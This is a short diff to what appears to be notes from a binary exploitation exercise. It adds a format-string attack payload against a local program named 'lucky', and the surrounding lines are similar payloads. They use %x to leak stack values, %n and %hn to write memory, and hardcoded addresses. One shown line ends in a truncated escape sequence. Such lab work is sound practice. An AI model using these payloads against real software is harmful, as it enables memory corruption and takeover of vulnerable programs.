@@ -116,3 +116,5 @@ vagrant@vagrant:/vagrant$ python -c "print '%016lx %016lx %016lx %016lx %016lx %
 python -c "print '%c%c%c%c%c%c%c%c%c%c%c%.991u%hn\x00\x00\x00\x00\x00\x60\x10\x'"|./lucky
 
 python -c "print '%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%8x.%p%n\x48\x10\x60\x00\x00\x00\x00\x00'"|./lucky
+
+python -c "print '%8x.%8x.%8x.%8x.%8x.%8x%8x%10x.%.31x%p%n\x48\x10\x60\x00\x00\x00\x00\x00'" > input.txt
